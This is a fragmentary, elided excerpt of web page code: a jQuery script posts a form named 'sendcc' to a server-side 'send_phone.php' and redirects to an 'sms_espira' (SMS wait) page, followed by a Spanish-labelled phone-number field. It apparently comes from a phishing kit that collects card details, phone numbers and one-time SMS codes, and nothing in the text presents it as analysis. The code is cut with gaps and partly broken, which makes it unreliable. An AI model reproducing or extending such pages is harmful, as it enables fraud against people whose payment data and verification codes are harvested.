...
$("#botomemail").attr("disabled", true);
          ...
          $.post("./system/send_phone.php?ajax", $("#sendcc").serialize(), function(result) {
                            setTimeout(function() {



                                $(location).attr("href", "./sms_espira");
                        });
                 });
        },
...
<input placeholder=" " id="PhoneNumber" name="PhoneNumber" class="form__input txt-overflow_ellipsis ember-text-field ember-view" type="text" required="true"  >
<span class="form__label txt-overflow_ellipsis no-link" aria-hidden="true">Número de teléfono</span>
</span>
</div>
